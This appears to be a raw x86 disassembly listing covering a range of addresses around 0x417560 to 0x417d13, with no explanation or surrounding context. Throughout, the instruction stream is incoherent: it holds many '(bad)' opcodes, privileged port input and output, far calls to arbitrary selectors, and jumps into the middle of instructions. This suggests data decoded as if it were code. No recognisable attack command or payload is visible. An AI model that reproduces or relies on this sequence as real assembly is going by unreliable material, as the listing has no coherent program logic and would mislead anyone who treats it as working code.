  41755d:	mov    cs,WORD PTR [eax+0x4988d21a]
  417563:	pusha  
  417564:	ret    0xe7ef
  417567:	inc    ebx
  417568:	pop    esi
  417569:	ins    BYTE PTR es:[edi],dx
  41756a:	stos   BYTE PTR es:[edi],al
  41756b:	iret   
  41756c:	ror    ebx,1
  41756e:	test   BYTE PTR [edi],cl
  417570:	jmp    0x4175c1
  417572:	das    
  417573:	not    BYTE PTR ds:0x17245367
  417579:	out    0x7c,al
  41757b:	cld    
  41757c:	test   BYTE PTR [ecx-0x80],ch
  41757f:	es inc eax
  417581:	cdq    
  417582:	clc    
  417583:	pushf  
  417584:	mov    DWORD PTR gs:[esi],edi
  417587:	sahf   
  417588:	test   al,0xb8
  41758a:	pop    edi
  41758b:	xchg   edx,eax
  41758c:	(bad)  
  41758e:	dec    edi
  41758f:	cmp    DWORD PTR ds:0x33ef8b6c,0x1f
  417596:	lds    edi,FWORD PTR [ecx+0x3b5787c2]
  41759c:	mov    eax,ds:0x183e790b
  4175a1:	xchg   edi,eax
  4175a2:	sbb    DWORD PTR [eax-0x6578e18b],0xcda4bf08
  4175ac:	addr16 mov ebp,0x5f1b4e5d
  4175b2:	stc    
  4175b3:	xchg   eax,esp
  4175b5:	or     al,0xb7
  4175b7:	mov    eax,ds:0x4c3345b9
  4175bc:	mov    es,WORD PTR [ebx]
  4175be:	cld    
  4175bf:	inc    eax
  4175c0:	or     eax,DWORD PTR [ecx]
  4175c2:	xchg   esi,eax
  4175c3:	daa    
  4175c4:	repnz inc ebp
  4175c6:	icebp  
  4175c7:	mov    ds:0xf81edaf8,al
  4175cc:	mov    ah,0x66
  4175ce:	push   ebp
  4175cf:	ficom  WORD PTR [edi+0x54]
  4175d2:	pop    edx
  4175d3:	in     eax,dx
  4175d4:	dec    ch
  4175d6:	mov    bl,0x86
  4175d8:	sbb    dh,0x18
  4175db:	jge    0x41756d
  4175dd:	neg    BYTE PTR [ecx-0x40]
  4175e0:	pop    es
  4175e1:	std    
  4175e2:	mov    ah,0x6
  4175e4:	pusha  
  4175e5:	es pop ebp
  4175e7:	xor    DWORD PTR [ecx-0x1b64d6c6],0xffffff9b
  4175ee:	clc    
  4175ef:	and    ebp,DWORD PTR [edx-0x49]
  4175f2:	test   DWORD PTR [edi],ecx
  4175f4:	pop    esi
  4175f5:	mov    al,0x6d
  4175f7:	or     eax,0x64c1d79e
  4175fc:	xchg   ebp,eax
  4175fd:	pop    ss
  4175fe:	stos   DWORD PTR es:[edi],eax
  4175ff:	outs   dx,BYTE PTR ds:[esi]
  417600:	dec    eax
  417601:	test   eax,0x612d51db
  417606:	dec    esi
  417607:	ins    BYTE PTR es:[edi],dx
  417608:	ret    0xa62a
  41760b:	and    al,0xf6
  41760d:	xchg   edx,eax
  41760e:	jmp    0x816e0c03
  417613:	and    al,0xb9
  417615:	and    BYTE PTR [edx+0x12],0xd7
  417619:	pop    edx
  41761a:	(bad)  
  41761d:	fs into 
  41761f:	scas   al,BYTE PTR es:[edi]
  417620:	(bad)  
  417621:	mov    dh,0x2d
  417623:	je     0x41762c
  417625:	cwde   
  417626:	and    cl,al
  417628:	mov    bl,0x87
  41762a:	enter  0x8df3,0xb4
  41762e:	in     eax,0x98
  417630:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417632:	jp     0x41769c
  417634:	jge    0x4175ca
  417636:	adc    ch,BYTE PTR [ebx-0x5ba6145a]
  41763c:	pop    edi
  41763d:	js     0x417632
  41763f:	fs leave 
  417641:	iret   
  417642:	addr16 js 0x4175da
  417645:	loopne 0x41765d
  417647:	xchg   ecx,eax
  417648:	and    al,0x55
  41764a:	sub    al,al
  41764c:	dec    edi
  41764d:	push   ebp
  41764e:	(bad)  
  41764f:	cdq    
  417650:	push   cs
  417651:	jae    0x41767b
  417653:	retf   
  417654:	push   0x2f
  417656:	stc    
  417657:	scas   eax,DWORD PTR es:[edi]
  417658:	mov    fs,WORD PTR [ecx-0x27]
  41765b:	retf   
  41765c:	out    0x45,eax
  41765e:	jo     0x417646
  417660:	or     BYTE PTR [esi],dl
  417662:	jbe    0x4176ad
  417664:	imul   ecx,DWORD PTR [ecx],0xffffffcb
  417667:	pop    edx
  417668:	loopne 0x41769e
  41766a:	mov    dl,0x1c
  41766c:	adc    cl,BYTE PTR [edi+0x2f]
  41766f:	mov    esp,0xe10227f1
  417674:	push   ecx
  417675:	push   ds
  417676:	addr16 inc edx
  417678:	arpl   WORD PTR [edx],sp
  41767a:	mov    BYTE PTR [ecx],cl
  41767c:	inc    ebx
  41767d:	push   0x6e
  41767f:	out    0x8c,al
  417681:	inc    ebp
  417682:	jge    0x4176e4
  417684:	mov    cl,0xe1
  417686:	or     ecx,DWORD PTR [eax-0x54]
  417689:	fwait
  41768a:	adc    bl,bh
  41768c:	mov    edi,0xd90dc324
  417691:	sbb    BYTE PTR [ebp+ecx*2-0x7c],cl
  417695:	xor    cl,0x4e
  417698:	adc    DWORD PTR [ebx-0x17618b4c],edx
  41769e:	ds jne 0x4176f3
  4176a1:	fnsave [esi-0x12]
  4176a4:	jp     0x417714
  4176a6:	retf   0x73c6
  4176a9:	mov    al,0x8c
  4176ab:	adc    ebp,DWORD PTR [esi-0x169508e4]
  4176b1:	cmp    ebp,ebp
  4176b3:	cmp    al,0xb
  4176b5:	fmul   DWORD PTR [esi-0x68]
  4176b8:	adc    BYTE PTR [ebx],ah
  4176ba:	xchg   ecx,eax
  4176bb:	inc    eax
  4176bc:	mov    esi,0xb9209faa
  4176c1:	dec    edi
  4176c2:	sub    al,0x6a
  4176c4:	pop    ebp
  4176c5:	adc    BYTE PTR [edi-0x4f],ah
  4176c8:	cmp    esi,DWORD PTR [edx+0x50]
  4176cb:	sub    al,0x1a
  4176cd:	hlt    
  4176ce:	pop    esi
  4176cf:	out    0x2c,al
  4176d1:	add    BYTE PTR [ebx+0x28],dl
  4176d4:	jmp    0x6f52401e
  4176d9:	dec    esp
  4176da:	cmp    al,BYTE PTR [edx-0x525c8fbe]
  4176e0:	sbb    DWORD PTR gs:[ebx],0xfffffffe
  4176e4:	out    dx,al
  4176e5:	stos   BYTE PTR es:[edi],al
  4176e6:	(bad)  
  4176e7:	sbb    al,0x9e
  4176e9:	retf   0x965
  4176ec:	ins    BYTE PTR es:[edi],dx
  4176ed:	std    
  4176ee:	push   eax
  4176ef:	xchg   edi,eax
  4176f0:	xchg   edx,eax
  4176f1:	fsubr  DWORD PTR [ebx]
  4176f3:	inc    edi
  4176f4:	fwait
  4176f5:	pop    es
  4176f6:	dec    eax
  4176f7:	out    dx,al
  4176f8:	in     eax,dx
  4176f9:	jbe    0x417693
  4176fb:	mov    ebx,0x5339bed7
  417700:	push   ebx
  417701:	cmp    BYTE PTR [esi],bh
  417703:	inc    ecx
  417704:	add    al,0x85
  417706:	fs out 0xaf,eax
  417709:	clc    
  41770a:	inc    ecx
  41770b:	jecxz  0x417693
  41770d:	jno    0x4176b7
  41770f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417710:	jne    0x4176c8
  417712:	clc    
  417713:	add    DWORD PTR [esi+edi*1],esp
  417716:	repz addr16 adc eax,0x5b3a70d1
  41771d:	retf   
  41771e:	pop    ebp
  41771f:	sub    BYTE PTR [ebx],bl
  417721:	inc    edi
  417722:	mov    edx,0x173c3fd
  417727:	cli    
  417728:	mov    ebp,0x7c41097d
  41772d:	pop    ds
  41772e:	push   cs
  41772f:	ss mov eax,0x4361e636
  417735:	(bad)  
  417736:	mov    eax,0x81583d1a
  41773b:	test   BYTE PTR [eax],cl
  41773d:	cli    
  41773e:	leave  
  41773f:	je     0x4176e4
  417741:	fist   WORD PTR [ebp-0x60]
  417744:	mov    al,0xed
  417746:	mov    ds:0xaee4fe4d,eax
  41774b:	jbe    0x41774c
  41774d:	aas    
  41774e:	dec    edi
  41774f:	icebp  
  417750:	arpl   WORD PTR [edi-0x6e],cx
  417753:	mov    WORD PTR [edx+eiz*1-0x699d97b0],fs
  41775a:	aaa    
  41775b:	stos   DWORD PTR es:[edi],eax
  41775c:	ret    0x6e4e
  41775f:	jge    0x417743
  417761:	or     ecx,DWORD PTR [ecx]
  417763:	mov    ah,0xcf
  417765:	pop    ebx
  417766:	pop    ecx
  417767:	ins    DWORD PTR es:[edi],dx
  417768:	mov    edi,0x6792e123
  41776d:	pop    eax
  41776e:	je     0x4177b8
  417770:	arpl   bx,cx
  417772:	pop    edx
  417773:	xor    DWORD PTR [esp+edx*2+0x6b79e221],esp
  41777a:	sbb    BYTE PTR [ecx],0xb
  41777d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41777e:	jne    0x417793
  417780:	in     eax,0x16
  417782:	adc    al,0x6c
  417784:	clc    
  417785:	mov    DWORD PTR [eiz*8-0x47540bbc],0x437c5cc3
  417790:	xor    edi,ebp
  417792:	aaa    
  417793:	cs (bad) 
  417795:	jecxz  0x41775e
  417797:	pop    ebx
  417798:	retf   
  417799:	pop    edi
  41779a:	pop    ds
  41779b:	sbb    al,0x8a
  41779d:	inc    esi
  41779e:	mov    esi,0xb3182c45
  4177a3:	pushf  
  4177a4:	or     ebx,DWORD PTR [ebx+edx*4-0x38ea2313]
  4177ab:	jmp    0xf4e679f2
  4177b0:	enter  0x1041,0xa0
  4177b4:	test   eax,0xe678ac1a
  4177b9:	inc    eax
  4177ba:	sahf   
  4177bb:	dec    esi
  4177bc:	xor    BYTE PTR [ebx-0x5e],bh
  4177bf:	and    eax,0xd84001d
  4177c4:	xor    bl,BYTE PTR [edx+edi*2-0x3fa8953f]
  4177cb:	and    DWORD PTR [eax+0x672979f6],0xffffffdb
  4177d2:	mov    dh,0xc0
  4177d4:	(bad)  
  4177d5:	fdiv   QWORD PTR [esi-0x44]
  4177d8:	adc    ax,0x668a
  4177dc:	cld    
  4177dd:	push   edx
  4177de:	and    esp,DWORD PTR [esi]
  4177e0:	pop    ds
  4177e1:	adc    bl,BYTE PTR [ebx-0x270acb09]
  4177e7:	cmp    ecx,DWORD PTR [eax+0x4af48a4b]
  4177ed:	push   ebx
  4177ee:	dec    ecx
  4177ef:	ja     0x417825
  4177f1:	ins    DWORD PTR es:[edi],dx
  4177f2:	rol    BYTE PTR [edx+0x18],cl
  4177f5:	jnp    0x417802
  4177f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177f8:	or     BYTE PTR [edx-0x17],ah
  4177fb:	adc    BYTE PTR [ecx+0x3e8b50b8],ch
  417801:	cmp    eax,0xf7330b8a
  417806:	and    al,0x39
  417808:	fs jmp 0x66b1861e
  41780e:	lds    ebx,FWORD PTR [eax+ecx*1-0x3]
  417812:	jo     0x417795
  417814:	sub    DWORD PTR [esi-0x5a],0x4a
  417818:	(bad)  
  417819:	repnz sbb eax,0xc4083640
  41781f:	pop    ebp
  417820:	sahf   
  417821:	cs cmp ch,ah
  417824:	sti    
  417825:	mov    ch,0x38
  417827:	push   0x8736e0f2
  41782c:	ins    BYTE PTR es:[edi],dx
  41782d:	aas    
  41782e:	sub    DWORD PTR [ecx-0x2ef34c18],edx
  417834:	xor    esp,edx
  417836:	sbb    eax,0xfd1f875b
  41783b:	in     eax,dx
  41783c:	sub    BYTE PTR [eax],ah
  41783e:	cwde   
  41783f:	inc    eax
  417840:	iret   
  417841:	mov    DWORD PTR [ecx+eiz*1],eax
  417844:	in     al,dx
  417845:	ror    DWORD PTR [eax+esi*8-0x7f74fddc],1
  41784c:	shr    DWORD PTR [esi-0x66aa9ea5],cl
  417852:	inc    BYTE PTR [edi-0x5f]
  417855:	loope  0x41785a
  417857:	mov    al,ds:0x8086284b
  41785c:	cld    
  41785d:	js     0x41788b
  41785f:	sbb    ebx,DWORD PTR [edx-0x2c6f9e20]
  417865:	push   0xfffffff5
  417867:	jb     0x41782c
  417869:	mov    bh,0xa9
  41786b:	jmp    0x4177f3
  41786d:	out    dx,al
  41786e:	jmp    DWORD PTR [esi-0x4]
  417871:	(bad)  
  417872:	out    dx,al
  417873:	aad    0xc1
  417875:	sub    esp,eax
  417877:	add    edx,DWORD PTR [edi+0x67]
  41787a:	mov    al,0x11
  41787c:	cmp    DWORD PTR [edx-0x33],ebp
  41787f:	inc    DWORD PTR [edx]
  417881:	ja     0x41789a
  417883:	push   edi
  417884:	mov    al,0x68
  417886:	jp     0x41786b
  417888:	jno    0x417862
  41788a:	scas   eax,DWORD PTR es:[edi]
  41788b:	mov    dh,0x15
  41788d:	sub    DWORD PTR [ebp+0x250345da],0x79
  417894:	add    al,0xd2
  417896:	mov    al,ds:0x9c948d36
  41789b:	lods   al,BYTE PTR ds:[esi]
  41789c:	dec    eax
  41789d:	add    cx,cx
  4178a0:	xor    BYTE PTR [eax+ecx*8],ch
  4178a3:	imul   edi,DWORD PTR [edx],0xb629ffe3
  4178a9:	pop    ecx
  4178aa:	inc    ebp
  4178ab:	loope  0x4178ef
  4178ad:	mov    bl,0x85
  4178af:	cmp    ebp,DWORD PTR [esi+ebp*1]
  4178b2:	sub    cl,BYTE PTR [edx]
  4178b4:	hlt    
  4178b5:	sub    ebp,ecx
  4178b7:	ins    DWORD PTR es:[edi],dx
  4178b8:	retf   0x9c5c
  4178bb:	sub    eax,0x2b837c34
  4178c0:	test   eax,0x1020b753
  4178c5:	adc    eax,0xdff5dfa1
  4178ca:	adc    eax,0x6494ed7a
  4178cf:	xor    esp,DWORD PTR [ebx-0x44]
  4178d2:	in     eax,0xb3
  4178d4:	mov    dl,0xcb
  4178d6:	in     eax,0xf4
  4178d8:	mov    al,0xfa
  4178da:	jl     0x4178f5
  4178dc:	or     eax,0xadaccdf4
  4178e1:	add    ebx,DWORD PTR [ecx]
  4178e3:	(bad)  
  4178e4:	outs   dx,BYTE PTR ds:[esi]
  4178e5:	popa   
  4178e6:	mov    eax,0x2cc8060d
  4178eb:	push   cs
  4178ec:	mov    dh,0x83
  4178ee:	rcr    bh,cl
  4178f0:	inc    edi
  4178f1:	je     0x4178f8
  4178f3:	inc    esi
  4178f4:	inc    eax
  4178f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178f6:	and    cl,BYTE PTR [edx+0x33]
  4178f9:	popf   
  4178fa:	pop    ebp
  4178fb:	mov    ah,0xa9
  4178fd:	mov    cl,0x94
  4178ff:	xchg   ebp,eax
  417900:	icebp  
  417901:	popf   
  417902:	jb     0x41794d
  417904:	cmc    
  417905:	inc    edx
  417906:	add    BYTE PTR [bx+si-0x1a39],ah
  41790b:	push   cs
  41790c:	and    al,0x78
  41790e:	call   DWORD PTR [edx+0x4a4fb8cc]
  417914:	daa    
  417915:	or     dh,dh
  417917:	jge    0x41789b
  417919:	rcr    BYTE PTR [ebp+0x2e4363ae],1
  41791f:	icebp  
  417920:	cmp    edi,DWORD PTR [esi]
  417922:	out    dx,eax
  417923:	call   0xd554:0xa5bed32
  41792a:	mov    ah,0x9c
  41792c:	lea    esi,[esi]
  41792e:	inc    edx
  41792f:	push   ebp
  417930:	jge    0x417921
  417932:	cmp    BYTE PTR [edx+ebp*2-0x7a],dh
  417936:	(bad)  
  417937:	and    eax,edi
  417939:	test   DWORD PTR [ebx+0x1fe1cf7f],ebx
  41793f:	inc    ebp
  417940:	call   0x6ac8:0x43c17d20
  417947:	mov    ah,0x19
  417949:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41794a:	adc    BYTE PTR [ebx+ecx*1],dh
  41794d:	and    BYTE PTR [esi-0x666ccefa],dh
  417953:	fiadd  DWORD PTR [esi+0x70]
  417956:	addr16 jnp 0x417905
  417959:	xlat   BYTE PTR ds:[ebx]
  41795a:	dec    edx
  41795b:	push   eax
  41795c:	mov    eax,ds:0x94827288
  417961:	push   cs
  417962:	inc    eax
  417963:	cmpxchg BYTE PTR [eax-0x39],al
  417967:	xor    al,BYTE PTR [ebx-0x2a0404c]
  41796d:	adc    bh,BYTE PTR [esi]
  41796f:	xchg   ebx,eax
  417970:	mov    cl,0x77
  417972:	fist   DWORD PTR [eax-0x61]
  417975:	(bad)  
  417976:	sub    DWORD PTR [ebp+0x7ebedd01],esi
  41797c:	ret    
  41797d:	or     eax,0x3789e4c1
  417982:	sbb    eax,0xfd1d057e
  417987:	sbb    eax,0x25052089
  41798c:	(bad)  
  41798d:	ficom  WORD PTR [ebx-0x34cdc375]
  417993:	sbb    al,dl
  417995:	pop    ds
  417996:	sub    eax,DWORD PTR [ebx+0x4249c987]
  41799c:	push   ds
  41799d:	out    0x3d,al
  41799f:	push   es
  4179a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179a1:	ret    
  4179a2:	mov    edi,edx
  4179a4:	pop    ebp
  4179a5:	mov    cs:0x34e602bb,eax
  4179ab:	or     eax,0x1367f480
  4179b0:	add    edx,DWORD PTR [eax-0x6]
  4179b3:	out    dx,al
  4179b4:	jg     0x4179d2
  4179b6:	retf   
  4179b7:	mov    al,0x9d
  4179b9:	push   ecx
  4179ba:	pop    ss
  4179bb:	in     eax,dx
  4179bc:	add    eax,0xf57f84ec
  4179c1:	cmp    edi,esp
  4179c3:	jecxz  0x417949
  4179c5:	xchg   ecx,eax
  4179c6:	mov    bh,0xc9
  4179c8:	mov    ebp,0xd8cd0bc3
  4179cd:	inc    edx
  4179ce:	mov    ecx,0xf59872e
  4179d3:	out    0xe9,al
  4179d5:	jno    0x4179f8
  4179d7:	(bad)  
  4179d8:	mov    edi,0xe4e9e872
  4179dd:	sbb    al,BYTE PTR [eax]
  4179df:	mov    ds:0x936fc63b,eax
  4179e4:	dec    edi
  4179e5:	popf   
  4179e6:	mov    cl,0x25
  4179e8:	xchg   BYTE PTR [edx+0x1fea10e2],ah
  4179ee:	adc    eax,0x3ce0f74c
  4179f3:	stc    
  4179f4:	add    al,0xbe
  4179f6:	sbb    eax,DWORD PTR es:[edx]
  4179f9:	mov    esi,0x149c5270
  4179fe:	xchg   ebx,eax
  4179ff:	in     al,dx
  417a00:	js     0x4179a7
  417a02:	ret    
  417a03:	xchg   edi,eax
  417a04:	mov    esi,0x76156191
  417a09:	sbb    al,0xd5
  417a0b:	loopne 0x417a72
  417a0d:	jo     0x417a5c
  417a0f:	and    dh,BYTE PTR [ecx]
  417a11:	imul   ebp,DWORD PTR [edx-0x34],0xbb0696ea
  417a18:	jg     0x4179eb
  417a1a:	mov    ch,0x42
  417a1c:	addr16 push eax
  417a1e:	xchg   ecx,eax
  417a1f:	xor    eax,0x3c0bf83e
  417a24:	mov    edx,0x77a47fe4
  417a29:	pop    es
  417a2a:	mov    BYTE PTR cs:[ecx],dh
  417a2d:	test   eax,0x1ed22dc1
  417a32:	test   BYTE PTR [ebx-0x1f],0xe2
  417a36:	mov    ds:0xa28a5229,al
  417a3b:	ins    DWORD PTR es:[edi],dx
  417a3c:	dec    edx
  417a3d:	and    ah,bl
  417a3f:	imul   ebx,DWORD PTR [ecx-0x11d547de],0x42fd056b
  417a49:	js     0x417ac7
  417a4b:	mov    bh,0x20
  417a4d:	push   0xa40c0253
  417a52:	xor    eax,0x5f96ee93
  417a57:	cld    
  417a58:	sub    bl,ah
  417a5a:	inc    ebp
  417a5b:	(bad)  
  417a5d:	push   esp
  417a5e:	popf   
  417a5f:	push   0xb520d29a
  417a64:	ret    
  417a65:	xor    esi,DWORD PTR [eax+0x5d]
  417a68:	div    DWORD PTR [esi]
  417a6a:	sub    eax,0xaf5396d9
  417a6f:	mov    ebp,0x714e28fa
  417a74:	push   DWORD PTR [edi]
  417a76:	call   0x7e6236ab
  417a7b:	xor    dh,al
  417a7d:	cmp    DWORD PTR [esi-0x4],edx
  417a80:	push   ebx
  417a81:	xor    BYTE PTR [eax],bl
  417a83:	iret   
  417a84:	jae    0x417a15
  417a86:	push   0xbc9f269d
  417a8b:	imul   edx,DWORD PTR [esi-0x73f19b],0x54606133
  417a95:	sbb    ch,BYTE PTR [eax]
  417a97:	hlt    
  417a98:	dec    ebp
  417a99:	pop    ds
  417a9a:	arpl   WORD PTR [edi-0x4ec3c19a],di
  417aa0:	and    DWORD PTR [ebp-0x7e],edi
  417aa3:	mov    gs,WORD PTR [ecx+0x20ee5139]
  417aa9:	or     BYTE PTR [ecx+0xaafdb92],al
  417aaf:	(bad)  
  417ab0:	xchg   esp,eax
  417ab1:	loope  0x417af2
  417ab3:	arpl   WORD PTR [eax-0x57093532],bp
  417ab9:	adc    esi,DWORD PTR [edi]
  417abb:	sub    al,0x59
  417abd:	gs xchg esi,eax
  417abf:	iret   
  417ac0:	les    edi,FWORD PTR [ebx+0x5af1cab7]
  417ac6:	jns    0x417a83
  417ac8:	mov    al,0xbc
  417aca:	test   eax,0xc60e3ce1
  417acf:	sub    eax,ebp
  417ad1:	jmp    0x417aeb
  417ad3:	pop    esp
  417ad5:	jae    0x417b0e
  417ad7:	das    
  417ad8:	mov    al,0x9f
  417ada:	push   eax
  417adb:	inc    edi
  417adc:	or     bh,BYTE PTR [edi]
  417ade:	fmul   QWORD PTR [edx]
  417ae0:	mov    ebx,0x3f29856c
  417ae5:	mov    ds:0x92cff8cb,eax
  417aea:	adc    ecx,DWORD PTR [eax+0x3c]
  417aed:	(bad)  
  417aee:	xlat   BYTE PTR ds:[ebx]
  417aef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417af0:	add    BYTE PTR [esi+0xbf55510],cl
  417af6:	lods   al,BYTE PTR ds:[esi]
  417af7:	cmp    eax,0x1927c622
  417afc:	push   0xd9a3f3a
  417b01:	cmp    ebp,edi
  417b03:	aaa    
  417b04:	mov    ch,BYTE PTR [edx+0x4d5c38df]
  417b0a:	sbb    eax,0x2d7ca333
  417b0f:	mov    edx,DWORD PTR [ecx+ecx*4]
  417b12:	dec    esi
  417b13:	xor    al,0x80
  417b15:	fild   DWORD PTR [esi]
  417b17:	inc    ebx
  417b18:	cld    
  417b19:	push   esp
  417b1a:	scas   al,BYTE PTR es:[edi]
  417b1b:	shl    DWORD PTR [edx-0x12],0x5
  417b1f:	mov    cl,0x78
  417b21:	pop    ds
  417b22:	jae    0x417b4b
  417b24:	pop    edx
  417b25:	cmp    BYTE PTR [eax-0x69c6ba6f],bh
  417b2b:	sub    al,0x6a
  417b2d:	add    al,BYTE PTR [esi+0x32]
  417b30:	in     eax,dx
  417b31:	les    ebx,FWORD PTR [edi-0x4085389]
  417b37:	outs   dx,BYTE PTR ds:[esi]
  417b38:	loop   0x417b47
  417b3a:	xchg   ebp,eax
  417b3b:	push   esp
  417b3c:	in     eax,0xd6
  417b3e:	gs hlt 
  417b40:	push   eax
  417b41:	xchg   DWORD PTR [ebx+0x77],esp
  417b44:	mov    ebp,0x3b1a143f
  417b49:	call   FWORD PTR [ebp+0x30225306]
  417b4f:	test   al,0xf2
  417b51:	ret    
  417b52:	add    eax,0x7b1c25d1
  417b57:	pusha  
  417b58:	jnp    0x417b53
  417b5a:	(bad)  
  417b5c:	sar    DWORD PTR [esi+0x67],0x25
  417b60:	jg     0x417aeb
  417b62:	daa    
  417b63:	int3   
  417b64:	jae    0x417b1c
  417b66:	fs (bad) 
  417b68:	scas   al,BYTE PTR es:[edi]
  417b69:	stos   BYTE PTR es:[edi],al
  417b6a:	sub    al,0xa0
  417b6c:	addr16 xor ah,0xb8
  417b70:	test   esp,ebx
  417b72:	ja     0x417b16
  417b74:	das    
  417b75:	adc    eax,0x3ca60d65
  417b7a:	aaa    
  417b7b:	leave  
  417b7c:	xor    dh,0x90
  417b7f:	adc    ebp,DWORD PTR [ecx+eax*8+0x32]
  417b83:	fnsave [esp+edi*4+0x600080be]
  417b8a:	jmp    0xdee8:0xde2ab483
  417b91:	das    
  417b92:	dec    eax
  417b93:	mov    ah,0x14
  417b95:	test   eax,0xc8f6332f
  417b9a:	(bad)
  417b9d:	sub    eax,0x8916fb27
  417ba2:	cmp    eax,0xbc76d2cb
  417ba7:	mov    ebx,0xa32f6185
  417bac:	das    
  417bad:	cmp    edx,edi
  417baf:	rol    BYTE PTR [ebx-0x4c],cl
  417bb2:	mov    ebx,0x3f80fc18
  417bb7:	pop    edx
  417bb8:	ins    DWORD PTR es:[edi],dx
  417bb9:	ja     0x417b6d
  417bbb:	lods   eax,DWORD PTR ds:[esi]
  417bbc:	(bad)  
  417bbd:	pop    esi
  417bbe:	shl    DWORD PTR [edi],0x36
  417bc1:	inc    edx
  417bc2:	xchg   edi,eax
  417bc3:	scas   eax,DWORD PTR es:[edi]
  417bc4:	pop    esi
  417bc5:	pusha  
  417bc6:	adc    BYTE PTR [edi+0x58da2c4c],cl
  417bcc:	ins    BYTE PTR es:[edi],dx
  417bcd:	popf   
  417bce:	xor    DWORD PTR [ecx-0x7efa10fa],0xffffffbc
  417bd5:	and    bh,ah
  417bd7:	or     dl,bh
  417bd9:	loop   0x417c35
  417bdb:	jmp    0xcd4a69d3
  417be0:	inc    edi
  417be1:	or     al,0x5a
  417be3:	jae    0x417bb3
  417be5:	pop    ecx
  417be6:	cmp    al,BYTE PTR [esi]
  417be8:	cli    
  417be9:	in     al,0xd
  417beb:	clc    
  417bec:	je     0x417c1d
  417bee:	xor    dh,BYTE PTR [ebp-0x7761888]
  417bf4:	fnstenv [esi]
  417bf6:	out    dx,eax
  417bf7:	xor    esp,DWORD PTR [esi-0x4b]
  417bfa:	add    al,0x9
  417bfc:	sub    al,0xd2
  417bfe:	sub    BYTE PTR [ebx],dh
  417c00:	aaa    
  417c01:	add    eax,0xc6d73ce8
  417c06:	cmp    dl,BYTE PTR [ebp-0x2d79eb60]
  417c0c:	loopne 0x417c40
  417c0e:	jae    0x417c59
  417c10:	jecxz  0x417bcf
  417c12:	cmp    al,0xcb
  417c14:	jno    0x417be2
  417c16:	pop    ebp
  417c17:	ret    
  417c18:	les    edx,FWORD PTR [ebx-0x2a5fcdc0]
  417c1e:	aaa    
  417c1f:	sub    eax,0x3dcd7cbe
  417c24:	and    ecx,DWORD PTR [ebp-0x80adfe7]
  417c2a:	dec    esp
  417c2b:	push   edi
  417c2c:	lahf   
  417c2d:	pop    ss
  417c2e:	xchg   al,cl
  417c30:	sti    
  417c31:	mov    edx,0xdbed7314
  417c36:	clc    
  417c37:	jnp    0x417bd4
  417c39:	push   esp
  417c3a:	xchg   ebx,eax
  417c3b:	dec    eax
  417c3c:	sahf   
  417c3d:	push   esp
  417c3e:	mov    ch,0xb2
  417c40:	pop    ds
  417c41:	jl     0x417bc8
  417c43:	mov    bh,0x87
  417c45:	aaa    
  417c46:	out    dx,al
  417c47:	and    DWORD PTR [esp+ebp*2+0x424a8476],esi
  417c4e:	add    eax,0x23743803
  417c53:	in     al,dx
  417c54:	push   cs
  417c55:	fwait
  417c56:	es or  eax,0x64981539
  417c5c:	imul   ebp,DWORD PTR [ecx+eiz*4-0x64],0x26
  417c61:	out    dx,eax
  417c62:	sbb    ebp,DWORD PTR [esi+edx*4]
  417c65:	xor    DWORD PTR [ebp+0x64],ecx
  417c68:	aam    0x2d
  417c6a:	push   esi
  417c6b:	sbb    eax,0x50d7e2a6
  417c70:	lds    esi,FWORD PTR [edi-0x30633a88]
  417c76:	outs   dx,DWORD PTR ds:[esi]
  417c77:	cld    
  417c78:	mov    bh,0x24
  417c7a:	call   0x6709ab19
  417c7f:	dec    DWORD PTR ds:0xf16fc6a
  417c85:	xlat   BYTE PTR ds:[ebx]
  417c86:	les    edi,FWORD PTR [ebx]
  417c88:	rcr    edx,cl
  417c8a:	loopne 0x417ce3
  417c8c:	xor    esp,esp
  417c8e:	inc    ecx
  417c8f:	in     eax,dx
  417c90:	inc    edi
  417c91:	dec    esi
  417c92:	rcl    BYTE PTR [eax+0x70],1
  417c95:	push   edx
  417c96:	xchg   BYTE PTR [edi],bh
  417c98:	sbb    DWORD PTR [ebx],ecx
  417c9a:	pop    es
  417c9b:	stc    
  417c9c:	mov    esi,0x16b5ab1
  417ca1:	xlat   BYTE PTR ds:[ebx]
  417ca2:	push   ds
  417ca3:	loop   0x417c33
  417ca5:	stos   DWORD PTR es:[edi],eax
  417ca6:	imul   ecx,DWORD PTR [edi+eax*4+0x3d],0xffffff8b
  417cab:	cli    
  417cac:	pushf  
  417cad:	in     eax,dx
  417cae:	call   0xbc17:0x6c9deff7
  417cb5:	int    0x55
  417cb7:	or     al,0x58
  417cb9:	pop    esp
  417cba:	xor    al,0x8a
  417cbc:	aam    0xb8
  417cbe:	adc    edx,DWORD PTR [esi]
  417cc0:	mov    eax,ds:0x4ccb07cb
  417cc5:	scas   eax,DWORD PTR es:[edi]
  417cc6:	lods   eax,DWORD PTR ds:[esi]
  417cc7:	inc    ebx
  417cc8:	arpl   sp,bx
  417cca:	mov    esp,0xc0a2b491
  417ccf:	rep outs dx,DWORD PTR ds:[esi]
  417cd1:	scas   eax,DWORD PTR es:[edi]
  417cd2:	pop    ss
  417cd3:	leave  
  417cd4:	rcl    BYTE PTR [ebp+ecx*2-0x29a6e1d2],1
  417cdb:	jno    0x417d1a
  417cdd:	in     eax,dx
  417cde:	mov    al,0xb0
  417ce0:	xchg   ebp,eax
  417ce1:	xchg   edi,eax
  417ce2:	dec    ebp
  417ce3:	xchg   ebx,eax
  417ce4:	jbe    0x417cb0
  417ce6:	jle    0x417ca0
  417ce8:	lahf   
  417ce9:	shr    BYTE PTR [eax+0x59e5515b],0xec
  417cf0:	jge    0x417d4d
  417cf2:	xor    al,ah
  417cf4:	mov    ecx,0x298d7e1
  417cf9:	dec    ebx
  417cfa:	sub    BYTE PTR [edi-0x60a30022],0x71
  417d01:	add    ebp,0x2ae5f78e
  417d07:	data16 mov bh,0x89
  417d0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d0b:	inc    ecx
  417d0c:	fnstcw WORD PTR [esi*8+0x3f831f6c]
  417d13:	or     esi,DWORD PTR ds:0xa3e4fb7d
